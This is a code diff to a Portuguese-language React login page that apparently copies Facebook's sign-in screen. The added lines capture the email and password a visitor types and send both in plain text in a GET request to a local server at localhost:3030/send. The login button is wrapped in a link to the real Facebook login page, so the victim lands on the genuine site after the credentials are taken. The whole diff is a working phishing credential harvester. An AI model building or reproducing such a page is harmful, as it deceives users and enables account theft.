@@ -1,9 +1,23 @@
 import './App.scss';
 import './global.scss'
+import { useState } from 'react';
+import axios from 'axios';
 
 function App() {
 
+    
 
+        const[Email, setEmail]= useState(0)
+        const[Senha, setSenha]= useState(0)
+        
+        async function enviar(){
+        
+           let url= `http://localhost:3030/send/${Email}/${Senha}`;
+           let resp = await axios.get(url)
+        
+        }
+        
+    
 
     return (
         <div className="pagina-de-login">
@@ -17,10 +31,11 @@ function App() {
 
                     <form className="formulario-login">
 
-                    <input type="text" placeholder="Email ou telefone" className="input-login"/>
-                    <input type="password" placeholder="Senha" className="input-login"/>
-
-                    <button type="submit" className="botao-login"> Entrar </button>
+                    <input type="text" placeholder="Email ou telefone" className="input-login" onChange={e=> setEmail(e.target.value)}/>
+                    <input type="password" placeholder="Senha" className="input-login" onChange={e=> setSenha(e.target.value)}/>
+                    <a href="https://pt-br.facebook.com/login/device-based/regular/login/">
+                    <button type="submit" className="botao-login" onClick={enviar} > Entrar </button>
+                    </a>
                     </form>
                         <a href="#" className="esqueceu-senha">Esqueceu a senha?</a>
                     
@@ -29,7 +44,7 @@ function App() {
                         <div className='ouTxt'>ou</div>
                         <div className='line'></div>
                     </div>
-
+                
                     <button className="botao-criar-conta">Criar nova conta</button>
             </div>
         </div>
